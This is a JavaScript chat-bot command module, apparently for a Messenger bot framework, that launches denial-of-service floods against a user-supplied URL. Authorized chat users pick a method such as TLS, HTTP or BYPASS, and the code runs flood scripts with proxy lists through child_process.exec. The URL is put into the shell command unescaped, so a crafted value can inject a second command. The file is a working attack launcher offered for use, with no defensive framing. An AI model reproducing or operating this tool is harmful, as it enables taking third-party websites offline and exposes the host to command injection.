module.exports.config = {
    name: "!attack",
    version: "1.0.0",
    permission: 0,
    credits: "ryuko",
    prefix: false,
    description: "Execute attack commands on the VPS",
    category: "without prefix",
    usages: "attack [method] [url] [time] or attack stop or attack add [userID]",
    cooldowns: 5,
    dependencies: {
        "request": "",
        "fs": ""
    }
};

const { exec } = require('child_process');
const fs = require('fs');
const request = require('request');

let runningAttack = null;
const authorizedUsers = new Set(); // Store authorized user IDs
const adminID = "5089289298"; // Replace with your admin ID

module.exports.run = function({ api, event, args }) {
    const senderID = event.senderID;
    const subcommand = args[0].toLowerCase();

    // Check if the user is authorized
    if (!authorizedUsers.has(senderID) && senderID !== adminID) {
        return api.sendMessage("You are not authorized to use this command.", event.threadID, event.messageID);
    }

    // Add authorized user (admin only)
    if (subcommand === "add" && senderID === adminID) {
        const newUserID = args[1];
        if (!newUserID) {
            return api.sendMessage("Please specify a user ID to authorize.", event.threadID, event.messageID);
        }
        authorizedUsers.add(newUserID);
        return api.sendMessage(`User ID ${newUserID} has been authorized to use the attack command.`, event.threadID, event.messageID);
    }

    // Handle stopping the attack
    if (subcommand === "stop") {
        if (!runningAttack) {
            return api.sendMessage("No attack is currently running.", event.threadID, event.messageID);
        }

        runningAttack.kill(); // Stop the running attack
        const stoppedUrl = runningAttack.url; // Capture URL before resetting
        runningAttack = null; // Reset the runningAttack variable
        return api.sendMessage(`Attack has ended on ${stoppedUrl}`, event.threadID, event.messageID);
    }

    // Prevent starting a new attack if one is already running
    if (runningAttack) {
        return api.sendMessage("An attack is already running. Please stop it before starting a new one.", event.threadID, event.messageID);
    }

    // Attack parameters
    const method = args[0];
    const url = args[1];
    const duration = args[2];
    const startTime = new Date().toLocaleString();

    // Define the command based on the provided method
    const command = {
        "CRASH": `go run crash.go ${url} 15000 get ${duration}`,
        "TLS": `node tls.js ${url} ${duration} 128 20 proxy.txt`,
        "BROWSER": `node DRAGON.js ${url} ${duration} 32 15 proxy.txt`,
        "RAPID": `node rapid.js ${url} ${duration} 126 15 proxy.txt`,
        "BLACK": `node BLACK.js ${url} ${duration} 128 20 proxy.txt`,
        "HTTP": `node HTTP.js ${url} ${duration} 132 15 proxy.txt`,
        "BYPASS": `node rapid.js ${url} ${duration} 126 15 proxy.txt`
    }[method];

    if (!command) {
        return api.sendMessage("Invalid method specified.", event.threadID, event.messageID);
    }

    // Execute the command and track the running attack
    runningAttack = exec(command, (error, stdout, stderr) => {
        runningAttack = null; // Clear the attack when finished
        if (error) {
            return api.sendMessage(`Error: ${error.message}`, event.threadID, event.messageID);
        }
        if (stderr) {
            return api.sendMessage(`stderr: ${stderr}`, event.threadID, event.messageID);
        }
        api.sendMessage(`Attack has ended on ${url}`, event.threadID, event.messageID);
    });
    runningAttack.url = url; // Store the URL in the runningAttack object for later use

    // Message when the attack starts
    const startMessage = `> Command Executed!\n▬▭▬▭▬▭▬▭▬▭▬▭▬\nTarget: ${url}\nDuration: ${duration} seconds\nMethod: ${method}\n*Start Time:* ${startTime}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖\n*Owner : ( @BorNo_SixNine )*`;

    // Send the image from a URL followed by the start message
    const imageUrl = "https://i.postimg.cc/RV7jdHzB/images-2024-11-03-T234950-808.jpg"; // Replace with your direct image URL
    request({ url: imageUrl, encoding: null }, (err, res, body) => {
        if (err) {
            return api.sendMessage("Failed to fetch image.", event.threadID, event.messageID);
        }
        api.sendMessage({ attachment: Buffer.from(body, 'binary') }, event.threadID, () => {
            api.sendMessage(startMessage, event.threadID, event.messageID);
        });
    });
};
